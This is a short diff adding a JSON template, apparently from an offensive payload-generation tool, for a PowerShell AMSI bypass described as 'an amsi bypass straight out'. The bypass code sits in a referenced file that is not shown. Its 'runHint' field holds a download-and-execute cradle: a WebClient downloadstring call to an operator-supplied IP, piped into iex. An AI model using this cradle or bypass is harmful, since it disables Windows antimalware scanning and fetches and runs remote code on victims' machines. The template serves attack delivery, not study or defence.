@@ -1,0 +1,21 @@
+
+
+{
+  "categories" : ["PowerShell","amsi"],
+  "description" : "No template injections here just an amsi bypass straight out.",
+  "contentFile" : "psamsibypass.txt",
+  "shellCode" : {
+      "hasShellCode":false
+  },
+  "compilation" :{
+      "compilationType" : "powershell",
+      "compilationAttributes": [
+          {
+              "name": "saveAs",
+              "description": "Name of the powershell file to be created, can be full path or just a name",
+              "defaultValue": "run.txt"
+          }
+      ]
+  },
+  "runHint" : "(new-object system.net.webclient).downloadstring(\"http://[[[[ownIP]]]]/misc/run.txt\") | iex"
+}
